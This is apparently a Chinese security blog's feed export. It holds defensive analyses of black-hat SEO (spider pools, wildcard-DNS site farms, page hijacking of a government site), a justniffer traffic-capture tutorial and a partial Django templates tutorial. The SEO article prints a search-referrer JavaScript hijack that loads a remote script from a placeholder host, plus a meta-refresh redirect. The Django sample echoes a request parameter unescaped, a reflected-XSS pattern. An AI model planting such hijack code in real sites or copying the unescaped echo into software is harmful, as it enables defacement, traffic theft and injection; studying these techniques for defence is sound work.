<h4 id="蜘蛛池站点案例"><a href="#蜘蛛池站点案例" class="headerlink" title="蜘蛛池站点案例"></a>蜘蛛池站点案例</h4><p>在为本篇文章收集黑帽SEO相关资料时，我发现了一款经典的蜘蛛池站点，在此分享。<br><img src="/upload_image/20170515/12.png" alt=""><br>其特点是内容动态生成，刷新页面发现内容随机改变<br><img src="/upload_image/20170515/13.png" alt=""><br>很明显此网站内容都是通过动态寄生虫程序生成的，且不断变化内容来增加百度对其收录。（百度目前对原创内容的收录率比较高）</p>
<h4 id="几大搜索引擎收录情况"><a href="#几大搜索引擎收录情况" class="headerlink" title="几大搜索引擎收录情况"></a>几大搜索引擎收录情况</h4><p>百度搜索引擎收录情况：<br><img src="/upload_image/20170515/14.png" alt=""><br>谷歌搜索引擎收录情况：<br><img src="/upload_image/20170515/15.png" alt=""><br>bing搜索引擎收录情况：<br><img src="/upload_image/20170515/16.png" alt=""><br>搜狗搜索引擎收录情况：<br><img src="/upload_image/20170515/17.png" alt=""><br>通过对比几大常用搜索引擎对此蜘蛛池站点的收录情况，我们不难看出这套蜘蛛池程序目前只对百度搜索引擎爬虫有效。当然78条的收录量对于一个蜘蛛池站点来说不算很高，说明百度对此手段已有所防范。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/09/28/4/">黑帽SEO剖析之总结篇</a><br><a href="https://thief.one/2017/09/28/3/">黑帽SEO剖析之隐身篇</a><br><a href="https://thief.one/2017/09/28/2/">黑帽SEO剖析之工具篇</a><br><a href="https://thief.one/2017/09/28/1/">黑帽SEO剖析之手法篇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;视而不见，谓合道於希夷；挹之则盈，方同功於造化&lt;/blockquote&gt;&lt;br&gt;　　此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为工具篇，主要介绍黑帽seo中经常使用到的一些工具，及其用途。&lt;br&gt;　　搞黑帽SEO往往都是批量操作，因此自动化工具不可或缺，也是整个黑产环中比较重要的一环。本篇将会介绍几款黑帽seo中常用的工具，由于本篇写于一年前，因此部分工具可能已淘汰或者升级。&lt;br&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="http://thief.one/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑帽seo" scheme="http://thief.one/tags/%E9%BB%91%E5%B8%BDseo/"/>
    
  </entry>
  
  <entry>
    <title>黑帽SEO剖析之手法篇</title>
    <link href="http://thief.one/2017/09/28/1/"/>
    <id>http://thief.one/2017/09/28/1/</id>
    <published>2017-09-28T07:21:35.000Z</published>
    <updated>2017-09-28T09:22:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">视而不见，谓合道於希夷；挹之则盈，方同功於造化</blockquote><br>　　此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为黑帽SEO之手法篇，主要介绍黑帽seo的概念以及一些常用的手法。<br>　　首先得说黑帽SEO是个老话题，我不难想象评论区必定有人吐槽此手法已经由来已久，作者有炒冷饭的嫌疑。我对此观点表示认可，然而细细回味之后，却又感到无奈不解。一个早已被用烂的黑产手法，一个每年给互联网产业造成巨大损失的黑色手段，为何能一直延续至今？是技术上难以攻破，还是利益驱使下选择视而不见？<br><a id="more"></a><br>　　当我发现公开资源中对此黑产手法的介绍寥寥无几且并不详细时，原因便可想而知了。为了营造了一个良好的互联网环境，我在此结合实际案列对黑帽SEO这种黑产手段进行剖析介绍，希望能够使安全界同道引起共鸣，共同抵制。</p>
<p>　　由于距本文撰写已过去一年之久，而此期间我已不在研究相关技术，因此若文章内容有任何偏差及谬误请谅解。</p>
<p>插曲：有趣的是，就在前几天有位朋友询问了我关于黑帽SEO方面的问题，原因是他一位朋友运营的一个网站，页面莫名其妙出现了赌博博彩的内容，删除后又会自动生成，其十分苦难便寻求他帮忙。</p>
<h3 id="黑帽seo概念"><a href="#黑帽seo概念" class="headerlink" title="黑帽seo概念"></a>黑帽seo概念</h3><p>　　SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。<br>　　当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持（搜索引擎劫持）、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。</p>
<h3 id="SEO的一些黑色手法"><a href="#SEO的一些黑色手法" class="headerlink" title="SEO的一些黑色手法"></a>SEO的一些黑色手法</h3><p>　　黑帽SEO的手法很多，并且在不断地更新换代，其中最常见的包括利用泛解析做站群，入侵高权重网站挂暗链，入侵高权重网站做网页劫持，篡改高权重网站网页内容，利用高权重网站二级目录做推广页面，修改nginx配置做目录反向代理等等。接下来我结合实际案例，介绍一些常用的手段。</p>
<h4 id="利用泛解析建立泛二级域名站群"><a href="#利用泛解析建立泛二级域名站群" class="headerlink" title="利用泛解析建立泛二级域名站群"></a>利用泛解析建立泛二级域名站群</h4><p>　　利用DNS泛解析可以快速建立站群，因为一个一级域名便可以衍生出无数个二级域名，当然一般需要借助站群工具，因为建立站群需要有很多内容不同的页面，手工建立显然不可能。而seo人员大费周章地建立站群的目的，便是能够快速吸引大量的搜索引擎爬虫，增加网站在搜索引擎中的收录量。以下是某个泛二级域名站群案例截图：<br><img src="/upload_image/20170515/10.png" alt=""><br>　　需要说明的是，以上截图中的二级域名并不是通过一条条dns解析记录去绑定的，解析里面设置的是*，也就是泛解析。而服务器端有程序或者代码去控制当构造不同的二级域名访问时，会返回不同的网页内容，也就让搜索引擎误认为每个二级域名都是一个单独的网站。<br>　　泛解析有很多优点，比如对用户友好（即使输错二级域名也能跳转到目标网站），又能够更快速地被搜索引擎收录等。基于这些优点，很多站长会选择用此方式来增加网站收录，然而如果没有妥善的使用泛解析可能会带来难以想象的危害。</p>
<h4 id="利用泛解析做黑产"><a href="#利用泛解析做黑产" class="headerlink" title="利用泛解析做黑产"></a>利用泛解析做黑产</h4><p>利用泛解析做黑帽seo的方式也有很多种，基于是否需要入侵网站以及dns服务器，我分为入侵法与非入侵法来介绍。</p>
<h5 id="入侵法"><a href="#入侵法" class="headerlink" title="入侵法"></a>入侵法</h5><p>真实案例：几个月前我们发现一个重要政府网站出现了大量博彩页面，取证截图如下：<br><img src="/upload_image/20170515/8.png" alt=""><br>　　经过分析我发现，此手法利用的便是泛解析，从截图中可以看到出现了大量此政府网站的二级甚至三级域名，而这些域名都是随机构造的，访问后会跳转到博彩色情等非法页面，而访问一级域名又是正常的内容。且先不分析跳转的过程中用到了哪些技术，单从泛解析记录就不难看出，此网站被人篡改了dns解析记录。我们有理由相信，黑客获取了此域名的dns解析控制权限，并将此域名泛解析到黑客准备好的服务器上。那么黑客这么做的目的很明显，为了让搜索引擎快速收录二级或者三级域名，从而达到引流到非法页面的目的。<br>　　我们通过分析此政府网站被入侵特征推导出此事件过程应该是，黑客通过入侵手段获取到了该政府网站dns解析权限（如何获取暂不可知），然后通过添加泛解析记录，将此记录指向黑客准备好的服务器，而此服务器上有动态语言去实现通过不同二级域名访问，返回不同的页面结果功能。由于政府网站本身权重很高，因此二级域名页面被百度快速收录，达到为非法页面引流的目的。这种手法的好处在于不必入侵网站，而只要获取到域名解析权限即可（当然获取域名解析权限也并非易事）。</p>
<h5 id="非入侵法"><a href="#非入侵法" class="headerlink" title="非入侵法"></a>非入侵法</h5><p>真实案例：几天前我们发现有一个网站（sdddzg.cn）利用泛解析做恶意推广，查看网站特征后，我们尝试构造不同的二级域名访问，取证截图如下。<br>构造二级域名访问：<br><img src="/upload_image/20170515/21.png" alt=""><br>最终返回结果：<br><img src="/upload_image/20170515/22.png" alt=""><br>　　可以看到返回结果对网页内容以及url做了处理，当我们尝试构造不同的二级域名访问，发现返回结果内容都不一样，然而通过获取ip发现来自同一台服务器。首先我们不难想到，此域名一定是做了泛解析的，那么它是如何控制网页内容变化的呢？<br>查看网页源码可以看到jiang.gov.cn网页源码被嵌入到了目标网页中。<br><img src="/upload_image/20170515/24.png" alt=""><br>　　那么其实想要实现此技术也并不难，可以在服务端上用代码实现。首先通过获取请求的二级域名地址，然后去访问该二级域名内容获取源码镶嵌到自己的网页内。如果构造的二级域名内容不是一个完整的域名地址（如：1.sdddzg.cn），则随机返回一段源码。这种手法的好处在于不必入侵网站，只需要自己搭建一台服务器即可，但推广效果没有那么好。</p>
<h4 id="利用网站暗链"><a href="#利用网站暗链" class="headerlink" title="利用网站暗链"></a>利用网站暗链</h4><p>　　在网页中植入暗链这种手法已经相对落伍了，目前用的也比较少，因为搜索引擎已经能够对此作弊手法进行检测。为了介绍知识的完整性，此处我简单介绍一下。暗链也称为黑链，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现等。<br>具体介绍请参考：<a href="http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/">黑帽SEO之暗链</a></p>
<h4 id="利用高权重网站，构造关键词URL做推广"><a href="#利用高权重网站，构造关键词URL做推广" class="headerlink" title="利用高权重网站，构造关键词URL做推广"></a>利用高权重网站，构造关键词URL做推广</h4><p>真实案例：一年前当我刚研究黑帽SEO的时候发现了一个有趣的黑帽SEO方式，虽然手法比较拙劣老套，但却也有成效。于是在写这篇文章的时候，我特意找了一个典型案例，与大家分享，取证截图如下。<br><img src="/upload_image/20170515/1.png" alt=""><br>　　将URL中的参数内容显示到网页内，这原本是某些网页的一种特殊功能。以往的经验告诉我这种特性如果没有处理好，可能会引发XSS漏洞，而今我不得不认识到，这种特性也一直被用于黑帽seo。通过在url或者post数据包（常见于搜索框功能）中构造推广关键词，再将有推广关键词页面添加到蜘蛛池中，使搜索引擎收录就能达到推广的目的。一般此种手法常被用来推广qq号，盈利网站等（类似打广告），而当我们通过搜索引擎搜索某些关键词时（如色情资源），就会显示出此页面，从而达到推广自身账号或者网站的目的，当然这只是一种推广手段，并不太涉及引流。</p>
<h4 id="利用网页劫持引流"><a href="#利用网页劫持引流" class="headerlink" title="利用网页劫持引流"></a>利用网页劫持引流</h4><p>　　网页劫持，又叫网站劫持或者搜索引擎劫持，是目前黑帽SEO中最流行的一种做法。其原因可以简单概括为：易收录、难发现，易收录表现为搜索引擎尚没有很好的机制能够检测出此作弊手段，网页劫持手法仍然能够大量引流。难发现是指网页劫持手法比较隐蔽，一般非技术人员很难发现它的存在。<br>　　网页劫持从手法上可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；<br>　　网页劫持的表现形式可以是劫持跳转，也可以是劫持呈现的网页内容（与直接篡改网页内容不同），目前被广泛应用于私服、博彩等暴利行业。</p>
<h5 id="网页劫持真实案例"><a href="#网页劫持真实案例" class="headerlink" title="网页劫持真实案例"></a>网页劫持真实案例</h5><p><img src="/upload_image/20170515/2.png" alt=""><br>　　几个月前我处理了一起网页劫持案列，起因是某政府网站上出现了博彩相关内容（排除新闻页面），这显然是不合规的。排除管理员失误添加导致，恐怕此网站多半是被黑客入侵了。首先我访问了该记录上的链接，紧接着浏览器中出现了一个正常的政府页面，而也就须臾之间，网页瞬间又跳转到了博彩网页。<br>图一为正常政府页面：<br><img src="/upload_image/20170515/3.png" alt=""><br>图二为博彩页面：<br><img src="/upload_image/20170515/4.png" alt=""><br>　　可以看到博彩页面的域名为www.0980828.com，显然不是先前的政府网站域名xxxx.gov.cn。看到此现象，再结合多年安全经验，我大致能够猜测此网站应该是被网页劫持了。通过分析以上过程的数据包，不难发现在该网站前端页面被嵌入了一段非法代码。<br><img src="/upload_image/20170515/5.png" alt=""><br>此代码存放在43.250.75.61服务器上，查看该服务器信息，发现其在日本。<br><img src="/upload_image/20170515/7.png" alt=""><br>而通过访问此段代码，返回内容则是跳转到www.0980828.com网站上。<br><img src="/upload_image/20170515/6.png" alt=""><br>　　分析至此，我们不难发现，导致页面跳转的原因便是xxxx.gov.cn网页被非法嵌入了一窜代码，而此代码能够控制访问该网页时跳转到博彩页面。这是搜索引擎劫持最为基础且常见的一种方式，其变种甚多，类型方式也各异。最后我通过登录web服务器查看，发现了存在大量html文件被篡改，且都在文件开头被写入外部js引用。那么此入侵事件过程应该是，黑客通过web应用程序某些漏洞入侵服务器（实际是管理后台弱口令+任意文件上传），通过批量篡改服务器静态文件实现网页劫持的目的。网页劫持的手法非常多，并不是这一个案例就能概括的，更多详细情况请继续看下文介绍。</p>
<h5 id="服务端劫持"><a href="#服务端劫持" class="headerlink" title="服务端劫持"></a>服务端劫持</h5><p>　　服务端劫持也称为全局劫持，此手法为修改网站动态语言文件，判断访问来源控制返回内容，从而达到网页劫持的目的。其特点往往是通过修改asp/aspx/php等后缀名文件，达到动态呈现网页内容的效果。<br>　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本，然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问则返回正常页面。</p>
<h5 id="客户端劫持"><a href="#客户端劫持" class="headerlink" title="客户端劫持"></a>客户端劫持</h5><p>客户端劫持的手法也很多，但最常用的就两种：js劫持与Header劫持。</p>
<p>js劫持目的是通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。js植入手法是可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。</p>
<p>js劫持代码案例：<br>以下代码可以使通过搜索引擎搜索的并点击页面时，执行一段js并跳转到博彩页面；而直接输入网址访问网页时，跳转到一个404页面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">today=new Date();</div><div class="line">today=today.getYear()+<span class="string">"-"</span>+(today.getMonth()+1)+<span class="string">"-"</span>+today.getDate();</div><div class="line">var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+)&#123;1,2&#125;\//ig;</div><div class="line">var <span class="built_in">where</span> =document.referer;</div><div class="line"><span class="keyword">if</span>(regexp.test(<span class="built_in">where</span>))&#123;</div><div class="line">document.write (<span class="string">'&lt;script language="javascript" type="text/javascript" src="http://www.xxx.com/test.js"&gt;&lt;/script&gt;'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">window.location.href=<span class="string">"../../404.htm"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>　　代码分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。</p>
<p>header劫持，就是在html代码的head中添加特殊标签，代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"10; url=http://thief.one"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>header劫持利用的就是Meta Refresh Tag（自动转向）功能将流量引走。</p>
<h4 id="直接篡改网页内容（比较低级）"><a href="#直接篡改网页内容（比较低级）" class="headerlink" title="直接篡改网页内容（比较低级）"></a>直接篡改网页内容（比较低级）</h4><p>　　有些黑客在入侵网站后，喜欢直接篡改网页内容，比如放上自己的qq号，或者作为推广将网页篡改成非法页面。在此我对此做法的黑客表示鄙视，因为这是一种最恶劣最低级的手法。恶劣在于直接篡改网页内容，可能会导致网站无法挽回的损失；低级在于此手法极易被发现，起不到真正的引流推广作用。</p>
<h4 id="利用高权重网站二级目录"><a href="#利用高权重网站二级目录" class="headerlink" title="利用高权重网站二级目录"></a>利用高权重网站二级目录</h4><p>　　即黑客入侵网站后，在网站二级目录下创建很多自己做推广的页面。为了达到引流的目的黑客往往需要建立大量的二级目录页面，因此需要用到寄生虫程序来自动化的创建页面。此手法也需要入侵高权重网站，获取网站服务器权限。与网页劫持手法不同的是，此手法侧重点在于利用高权重网站自身的优势，在其目录下创建多个推广页面；而网页劫持侧重隐藏自身，其可以做到动态呈现网页内容给客户。因此在实际使用中，黑客经常结合两者使用。此手法与利用泛解析做黑帽seo的手法还是有明显差异的，虽然同样是利用高权重网站本身的优势，但泛解析利用的是二级域名，而此手法利用的是二级目录，当然两者有异曲同工之妙。<br>　　利用高权重网站二级目录手法的案例与泛解析案例类似，这里不再详述。既然我前面提到此手法往往需要寄生虫程序的配合使用，那么我们来看看，何为寄生虫程序？它又有何玄机？</p>
<h3 id="扩展知识"><a href="#扩展知识" class="headerlink" title="扩展知识"></a>扩展知识</h3><p><a href="https://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/">【黑帽SEO系列】暗链</a><br><a href="https://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/">【黑帽SEO系列】网页劫持</a><br><a href="https://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/">【黑帽SEO系列】页面跳转</a><br><a href="https://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">【黑帽SEO系列】基础知识</a></p>
<p>小结：黑产的技术再不断进步，我们没法停滞不前！</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/09/28/4/">黑帽SEO剖析之总结篇</a><br><a href="https://thief.one/2017/09/28/3/">黑帽SEO剖析之隐身篇</a><br><a href="https://thief.one/2017/09/28/2/">黑帽SEO剖析之工具篇</a><br><a href="https://thief.one/2017/09/28/1/">黑帽SEO剖析之手法篇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;视而不见，谓合道於希夷；挹之则盈，方同功於造化&lt;/blockquote&gt;&lt;br&gt;　　此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为黑帽SEO之手法篇，主要介绍黑帽seo的概念以及一些常用的手法。&lt;br&gt;　　首先得说黑帽SEO是个老话题，我不难想象评论区必定有人吐槽此手法已经由来已久，作者有炒冷饭的嫌疑。我对此观点表示认可，然而细细回味之后，却又感到无奈不解。一个早已被用烂的黑产手法，一个每年给互联网产业造成巨大损失的黑色手段，为何能一直延续至今？是技术上难以攻破，还是利益驱使下选择视而不见？&lt;br&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="http://thief.one/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑帽seo" scheme="http://thief.one/tags/%E9%BB%91%E5%B8%BDseo/"/>
    
  </entry>
  
  <entry>
    <title>justniffer抓取流量大法</title>
    <link href="http://thief.one/2017/09/27/1/"/>
    <id>http://thief.one/2017/09/27/1/</id>
    <published>2017-09-27T03:26:04.000Z</published>
    <updated>2017-11-01T03:21:36.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Understand yourself in order to better understanding others<br>知己方能解人</blockquote><br>　　本篇简单介绍一款流量抓取神器—justniffer，其能在线抓取流量也能离线分析数据包。justniffer与网络抓包神器wireshark相比，用法更为简单且对网络影响较小。面对海量的流量，我们需要经常从中分析出恶意请求，从而去做好防御，因此我在此记录justniffer的一些基础用法，以做备份查阅。<br><a id="more"></a></p>
<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo add-apt-repository ppa:oreste-notelli/ppa </div><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install justniffer</div></pre></td></tr></table></figure>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">justniffer -i eth5 -u -l <span class="string">"%request.header.host  %request.method %request.url  %response.grep(\r\n\r\n(.*)) %request.grep(\r\n\r\n(.*))"</span></div></pre></td></tr></table></figure>
<h4 id="重点参数"><a href="#重点参数" class="headerlink" title="重点参数"></a>重点参数</h4><ul>
<li>-i 指定监听的网络接口</li>
<li>-l 指定日志输出格式</li>
<li>-u 将不可打印的字符解析为.</li>
</ul>
<h4 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h4><ul>
<li>%request.header.host #请求头中的HOST</li>
<li>%request.method #请求类型</li>
<li>%request.url #请求URL</li>
<li>%request.grep(\r\n\r\n(.*)) #请求数据包</li>
<li>%response.grep(\r\n\r\n(.*)) #response的数据包</li>
</ul>
<h3 id="后期处理"><a href="#后期处理" class="headerlink" title="后期处理"></a>后期处理</h3><p>一般来说我们在抓取流量后，需要先保存在本地然后再进行规则的分析。然而如何保存，保存后该怎么提取关键内容呢？这里提供一个小小的方法。</p>
<h4 id="抓取流量存入文件"><a href="#抓取流量存入文件" class="headerlink" title="抓取流量存入文件"></a>抓取流量存入文件</h4><p>可以使用如下命令抓取指定几个参数的流量内容，并存入到文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">justniffer -i eth5 -u -l <span class="string">"%request.header.host NMASKnmask %request.method NMASKnmask %request.url NMASKnmask %response.grep(\r\n\r\n(.*)) NMASKnmask %request.grep(\r\n\r\n(.*))"</span> | awk -F nmask <span class="string">'$1 !~ /^-/ &amp;&amp; $2 ~ /(GET|POST).*/ &#123;print$2,$1,$3,$4,$5&#125;'</span>  &gt;&gt; /<span class="built_in">log</span>/20170927.log 2&gt;&amp;1</div></pre></td></tr></table></figure></p>
<p>说明：该命令获取了流量的host、method、url、response_body、request_body内容(注意：这里只筛选了GET、POST的请求)，然后将其存入了/log/20170927.log文件中。我们可以运行此命令一段时间，比如1个小时，当结束进程后我们便收集了一个小时的流量信息。</p>
<h4 id="处理日志文件"><a href="#处理日志文件" class="headerlink" title="处理日志文件"></a>处理日志文件</h4><p>打开/log/20170927.log文件，我们看到的每一行的内容格式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET NMASK www.baidu.com NMASK /test.html NMASK response_body=&#123;<span class="string">"result"</span>:<span class="string">"123"</span>&#125; NMASK request_body=&#123;<span class="string">"get"</span>:<span class="string">"123"</span>&#125;</div></pre></td></tr></table></figure></p>
<p>说明：每一行文件内容都包含一份流量信息，流量信息分为五个内容，每个内容间用NMASK（特殊字符串，可自定义）隔开。然后我们便可以写python脚本，遍历日志文件，并用split(“NMASK”)获取每一个流量信息了。</p>
<p>更多的配置信息、命令参数，可参考：<a href="http://www.jianshu.com/p/02021de8f82e" target="_blank" rel="external">http://www.jianshu.com/p/02021de8f82e</a></p>
<h3 id="Python使用justniffer"><a href="#Python使用justniffer" class="headerlink" title="Python使用justniffer"></a>Python使用justniffer</h3><p>需要借助subprocess模块：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import subprocess</div><div class="line"></div><div class="line">popen=subprocess.Popen(<span class="string">"justniffer -i eth0 -u -l '%request.header.host nmask %request.method nmask %request.url nmask %response.grep(\r\n\r\n(.*))' | awk -F nmask '<span class="variable">$1</span> !~ /^-/ &#123;print&#125;'"</span>,shell=True,stdout=subprocess.PIPE)</div><div class="line"></div><div class="line"><span class="keyword">while</span> 1:</div><div class="line">    p=popen.stdout.readline() <span class="comment">#一行一行取</span></div><div class="line">    <span class="built_in">print</span> p <span class="comment">#可自定义函数去处理流量</span></div><div class="line">    <span class="keyword">if</span> not p:</div><div class="line">        <span class="built_in">break</span></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Understand yourself in order to better understanding others&lt;br&gt;知己方能解人&lt;/blockquote&gt;&lt;br&gt;　　本篇简单介绍一款流量抓取神器—justniffer，其能在线抓取流量也能离线分析数据包。justniffer与网络抓包神器wireshark相比，用法更为简单且对网络影响较小。面对海量的流量，我们需要经常从中分析出恶意请求，从而去做好防御，因此我在此记录justniffer的一些基础用法，以做备份查阅。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://thief.one/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="justniffer" scheme="http://thief.one/tags/justniffer/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之模版</title>
    <link href="http://thief.one/2017/09/15/2/"/>
    <id>http://thief.one/2017/09/15/2/</id>
    <published>2017-09-15T08:33:11.000Z</published>
    <updated>2017-09-18T09:35:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Life is not all roses<br>人生并不是康庄大道</blockquote><br>　　Django中的模版即前端展示，或者说HTML页面，涉及到html、js、css的部分我不做太多了介绍，因为主要是前端的一些东西。本篇主要介绍一下模版与视图的相互传值，以及模版的继承等内容。<br><a id="more"></a></p>
<h3 id="创建模版"><a href="#创建模版" class="headerlink" title="创建模版"></a>创建模版</h3><p>默认情况下，我们在视图函数中使用render渲染index.html页面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">def home(request):</div><div class="line">    <span class="built_in">return</span> render(request, <span class="string">'index.html'</span>)</div></pre></td></tr></table></figure></p>
<p>之后在应用目录下新建一个templates文件，里面新建index.html文件即可。</p>
<h3 id="模版给视图传参"><a href="#模版给视图传参" class="headerlink" title="模版给视图传参"></a>模版给视图传参</h3><p>　　这一部分比较简单，比如使用form表单，向具体某个url传递一些参数，当然这里需要设置urls.py路由，不然模版的请求无法准确传达到视图的具体处理函数上。<br>模版：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"/add/"</span> method=<span class="string">"get"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"content"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span>&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
<p>视图：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">def add(request):</div><div class="line">    content=request.GET.get(<span class="string">"content"</span>)</div><div class="line"></div><div class="line">    <span class="built_in">return</span> HttpResponse(content)</div></pre></td></tr></table></figure></p>
<p>urls.py:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from webapp import views <span class="comment">#导入app的views文件</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^add/'</span>, views.add),</div></pre></td></tr></table></figure></p>
<p>模版给视图传默认值的参数:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"/update/"</span> method=<span class="string">"GET"</span>&gt;</div><div class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"nid"</span> value=<span class="string">"&#123;&#123; i.nid &#125;&#125;"</span>&gt;</div><div class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"获取详情"</span> /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
<p>说明：模版传给视图的update方法，参数为nid，值为i.nid。</p>
<h3 id="视图给模版传参"><a href="#视图给模版传参" class="headerlink" title="视图给模版传参"></a>视图给模版传参</h3><p>将上面的视图代码改成：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def add(request):</div><div class="line">    content=<span class="string">"123"</span></div><div class="line">    <span class="built_in">return</span> render(request,<span class="string">"index.html"</span>,&#123;<span class="string">"content"</span>:content&#125;)</div></pre></td></tr></table></figure></p>
